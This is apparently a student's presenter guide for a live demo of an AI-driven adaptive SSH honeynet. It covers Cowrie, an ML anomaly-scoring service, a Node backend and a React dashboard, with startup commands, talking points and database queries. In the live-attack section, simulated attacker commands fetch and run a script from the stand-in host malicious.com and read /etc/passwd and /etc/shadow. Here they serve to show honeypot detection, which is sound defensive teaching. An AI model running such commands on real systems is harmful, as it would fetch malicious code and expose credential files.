# 🎬 AI-DRIVEN ADAPTIVE HONEYNET - LIVE DEMO GUIDE

## 📋 PRE-DEMO CHECKLIST (5 minutes before presentation)

- [ ] Close all unnecessary programs
- [ ] Clear browser cache/history (Ctrl+Shift+Delete)
- [ ] Have 6 PowerShell windows ready
- [ ] Have browser ready at about:blank
- [ ] Increase terminal font size (Ctrl + Plus in PowerShell)

---

## 🚀 STARTUP SEQUENCE (Do this in front of your teacher)

### **TERMINAL 1 - Cowrie Honeypot** ⏱️ 5 seconds
```powershell
# Title: HONEYPOT - Cowrie SSH Trap
wsl -d Ubuntu-22.04 -u cowrie -- /home/cowrie/cowrie/cowrie-env/bin/cowrie start
wsl -d Ubuntu-22.04 -u cowrie -- /home/cowrie/cowrie/cowrie-env/bin/cowrie status
```

**What to say:**
> "First, I'm starting the Cowrie honeypot - this is a fake SSH server that 
> will capture real attack attempts on port 2222."

---

### **TERMINAL 2 - ML Service (Python)** ⏱️ 30 seconds
```powershell
# Title: ML SERVICE - Isolation Forest + Autoencoder
cd D:\boda\AI-Honeynet\HoneyNet\ml-service
.\venv\Scripts\activate
python -m uvicorn app:app --host 127.0.0.1 --port 8001
```

**What to say:**
> "Now starting the machine learning service. You can see it loading two models:
> - Isolation Forest for anomaly detection
> - Autoencoder neural network for pattern recognition"

**Wait for:** `✅ Loaded Isolation Forest model` and `✅ Loaded Autoencoder model`

---

### **TERMINAL 3 - ML Health Check** ⏱️ 2 seconds
```powershell
# Title: ML VERIFICATION
curl http://localhost:8001/health | ConvertFrom-Json
```

**What to say:**
> "Let me verify the ML service is healthy and models are loaded."

**Expected output:** `{"status":"healthy","models_loaded":true}`

---

### **TERMINAL 4 - Backend (Node.js)** ⏱️ 5 seconds
```powershell
# Title: BACKEND - Event Processing
cd D:\boda\AI-Honeynet\HoneyNet
npm run dev
```

**What to say:**
> "Starting the backend server. This connects to:
> - Cowrie logs (watching for attacks)
> - ML service (for classification)
> - PostgreSQL database (for storage)"

**Wait for:** `Server running on port 3000` and `ML Service: http://localhost:8001`

---

### **TERMINAL 5 - Frontend (React)** ⏱️ 5 seconds
```powershell
# Title: DASHBOARD - Real-time Visualization
cd D:\boda\AI-Honeynet\HoneyNet\frontend
npm run dev
```

**What to say:**
> "Finally, starting the dashboard for real-time visualization."

**Wait for:** `Local: http://localhost:5173/`

---

### **BROWSER - Open Dashboard**
```
http://localhost:5173
```

**What to say:**
> "Here's our live dashboard showing real-time threat intelligence."

---

## 🎯 DEMONSTRATION PART 1 - Show Current Data

### **TERMINAL 6 - Show Existing Analysis**
```powershell
# Title: ML ANALYSIS RESULTS
cd D:\boda\AI-Honeynet\HoneyNet
.\demo-results.ps1
```

**What to say:**
> "This shows the ML has already analyzed over 1,000 real attacks from the internet.
> Notice the anomaly scores ranging from 0.0 to 1.0 - these are calculated by
> the Isolation Forest and Autoencoder models."

**Point out:**
- Total events analyzed
- ML score distribution (HIGH/MEDIUM/LOW)
- Real attacker IPs from different countries
- Specific malicious commands detected

---

## 🔴 DEMONSTRATION PART 2 - Live Attack Simulation

### **TERMINAL 6 - Launch Attack Simulator**
```powershell
cd D:\boda\AI-Honeynet\HoneyNet
.\demo-attack.ps1
```

**What to say:**
> "Now I'll simulate 5 different attack types:
> 1. HIGH severity - Malware download
> 2. HIGH severity - Password harvesting  
> 3. HIGH severity - Reverse shell
> 4. LOW severity - Reconnaissance
> 5. MEDIUM severity - File exploration"

**Watch:** Dashboard updating in real-time!

---

## 📊 DEMONSTRATION PART 3 - Show ML Classification

### **TERMINAL 6 - Query Recent Classifications**
```powershell
$env:PGPASSWORD="honeynet123"
psql -U honeynet -d honeynet -h localhost -p 5432 -c "
SELECT 
    timestamp,
    LEFT(command, 60) as command,
    ROUND(anomaly_score::numeric, 3) as ml_score,
    CASE 
        WHEN anomaly_score > 0.7 THEN 'HIGH'
        WHEN anomaly_score > 0.4 THEN 'MEDIUM'
        ELSE 'LOW'
    END as severity
FROM events 
WHERE timestamp > NOW() - INTERVAL '5 minutes' 
  AND command IS NOT NULL
ORDER BY anomaly_score DESC
LIMIT 10;
"
```

**What to say:**
> "Here you can see the ML assigned different anomaly scores:
> - 0.900 for malicious commands (wget, curl, bash)
> - 0.607 for suspicious activity
> - Below 0.4 for normal reconnaissance
> 
> This isn't rule-based - the ML models learned these patterns from training data."

---

## 🛡️ DEMONSTRATION PART 4 - Show Adaptive Response

### **TERMINAL 6 - Show Automated Adaptations**
```powershell
$env:PGPASSWORD="honeynet123"
psql -U honeynet -d honeynet -h localhost -p 5432 -c "
SELECT 
    timestamp,
    action_type,
    severity,
    CASE WHEN success THEN '✅ Success' ELSE '❌ Failed' END as status
FROM adaptations
WHERE timestamp > NOW() - INTERVAL '5 minutes'
ORDER BY timestamp DESC
LIMIT 5;
"
```

**What to say:**
> "When the ML detects HIGH severity attacks, the system automatically adapts:
> - Changes SSH banner to confuse attackers
> - Modifies honeyfiles with fake credentials
> - Restarts services to reset the environment
> 
> This is the 'Adaptive' part - the system learns and responds automatically."

---

## 🎬 DEMONSTRATION PART 5 - Real-Time Attack

### **NEW TERMINAL 7 - Manual Attack**
```powershell
# Run this live:
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost -p 2222
# Password: 123456

# Then run these commands:
wget http://malicious.com/cryptominer.sh
chmod +x cryptominer.sh
./cryptominer.sh
cat /etc/passwd
cat /etc/shadow
exit
```

**What to say while typing:**
> "Watch the dashboard - as I type malicious commands, you'll see:
> 1. Events appearing in 'Recent Events'
> 2. ML calculating anomaly scores in real-time
> 3. Severity classification happening automatically
> 4. Pie chart updating with new threat data"

**After exit:**
> "Everything I just typed was captured, analyzed by ML, and classified - 
> all without any manual intervention."

---

## 💡 KEY POINTS TO EMPHASIZE

### **1. It's Real Machine Learning:**
- Not just keyword matching or rules
- Trained models (Isolation Forest + Autoencoder)
- Anomaly scores calculated mathematically
- Can detect novel attacks not in training data

### **2. It's Adaptive:**
- System modifies itself based on threats
- Automated responses to HIGH severity
- Changes defense posture dynamically
- No manual intervention required

### **3. It's Real-Time:**
- Events processed as they happen
- ML classification in seconds
- Dashboard updates live
- Immediate defensive actions

### **4. It Works with Real Threats:**
- Captured 1,000+ real attacks from internet
- Multiple attacker IPs from different countries
- Real malware download attempts
- Actual attack patterns analyzed

---

## 🎯 EXPECTED QUESTIONS & ANSWERS

**Q: "How does the ML know what's malicious?"**
> "The Isolation Forest was trained on 50,000+ labeled attack samples. It learned 
> patterns like: commands with 'wget' + 'bash', password file access, reverse shells.
> The Autoencoder learned normal behavior and flags deviations as anomalies."

**Q: "What if an attacker does something new?"**
> "That's the beauty of unsupervised learning - Isolation Forest detects anomalies
> even without seeing that exact attack before. Novel attacks look 'different' from
> normal behavior, so they get high anomaly scores."

**Q: "Is this just a demo or does it work with real attacks?"**
> "It's already captured real attacks! See those IPs like 103.248.70.88 and 
> 45.142.212.61? Those are actual attackers from the internet who found my honeypot
> and tried to install malware. The ML classified them correctly."

**Q: "How accurate is it?"**
> "Looking at the results: HIGH severity events are clearly malicious (wget malware,
> password theft). LOW severity are benign (whoami, ls). The ML achieves this without
> hardcoded rules - it's learning patterns."

---

## ⚠️ TROUBLESHOOTING (If something goes wrong)

### **If ML service fails to start:**
```powershell
# Check if port 8001 is already in use:
Get-NetTCPConnection -LocalPort 8001 -ErrorAction SilentlyContinue
# If yes, kill it:
Stop-Process -Id <PID> -Force
```

### **If backend can't connect to ML:**
```powershell
# Verify ML is responding:
curl http://localhost:8001/health
```

### **If no events appear:**
```powershell
# Check Cowrie is running:
wsl -d Ubuntu-22.04 -u cowrie -- /home/cowrie/cowrie/cowrie-env/bin/cowrie status
# Check backend is watching logs:
# Look for "Log watcher started successfully" in backend terminal
```

### **If dashboard is blank:**
```powershell
# Check if there's data:
$env:PGPASSWORD="honeynet123"
psql -U honeynet -d honeynet -h localhost -p 5432 -c "SELECT COUNT(*) FROM events;"
```

---

## 📸 SCREENSHOT CHECKLIST (Take these during demo)

1. [ ] All 5 terminals running services
2. [ ] ML service showing "models_loaded: true"
3. [ ] Backend logs showing "Server running on port 3000"
4. [ ] Dashboard with updated statistics
5. [ ] Database query showing ML scores
6. [ ] Adaptations table showing automated responses

---

## 🏁 SHUTDOWN (After demo)

```powershell
# Terminal 1:
wsl -d Ubuntu-22.04 -u cowrie -- /home/cowrie/cowrie/cowrie-env/bin/cowrie stop

# Terminals 2, 4, 5:
Ctrl + C (in each terminal)

# Database stays running (Windows service)
```

---

## ✅ SUCCESS CRITERIA

Your demo is successful if you show:

1. ✅ All 5 services starting cleanly
2. ✅ ML models loading (Isolation Forest + Autoencoder)
3. ✅ Live attacks generating events
4. ✅ ML assigning different scores (HIGH/MEDIUM/LOW)
5. ✅ Dashboard updating in real-time
6. ✅ Automated adaptations triggered
7. ✅ Database storing classified events

---

**TOTAL DEMO TIME: ~15 minutes**
- Setup: 5 minutes
- Explanation: 5 minutes  
- Live demonstration: 5 minutes

**GOOD LUCK! You've built something impressive!** 🚀
